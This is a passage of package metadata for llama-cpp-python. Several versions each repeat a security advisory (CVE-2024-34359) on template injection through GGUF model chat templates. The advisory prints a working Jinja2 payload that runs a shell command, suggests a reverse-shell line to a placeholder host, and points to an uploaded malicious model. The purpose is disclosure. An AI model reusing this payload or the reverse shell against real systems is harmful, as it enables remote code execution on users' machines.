exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.51":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.51/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.51","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"9d3a5476da33c736830b73393f05851c8eccea6f5a54ec2a0e35fc1297d1b219","md5":"0aa7d4a618ef07f7eacd80cad7250c63","sha256":"9fa1bdb34ba01c207ef77eaffcfdae9e0b11c94471adf364ff129ca5df7887ed"},"downloads":-1,"filename":"llama_cpp_python-0.2.51.tar.gz","has_sig":false,"md5_digest":"0aa7d4a618ef07f7eacd80cad7250c63","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36746983,"upload_time":"2024-02-26T02:18:35","upload_time_iso_8601":"2024-02-26T02:18:35.445851Z","url":"https://files.pythonhosted.org/packages/9d/3a/5476da33c736830b73393f05851c8eccea6f5a54ec2a0e35fc1297d1b219/llama_cpp_python-0.2.51.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.52":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.52/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.52","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"4c09a1fefdac604d70b211918a0dbe47d65573368db8988a5fa4f0777e950f12","md5":"b0660eb648bd01c8d28f51c90a338206","sha256":"cc3f670ea5b315547396b0bbc108fcc9602d19b8af858e03c4c0fae385fb9a04"},"downloads":-1,"filename":"llama_cpp_python-0.2.52.tar.gz","has_sig":false,"md5_digest":"b0660eb648bd01c8d28f51c90a338206","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36774930,"upload_time":"2024-02-26T16:45:41","upload_time_iso_8601":"2024-02-26T16:45:41.625486Z","url":"https://files.pythonhosted.org/packages/4c/09/a1fefdac604d70b211918a0dbe47d65573368db8988a5fa4f0777e950f12/llama_cpp_python-0.2.52.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.53":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.53/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp 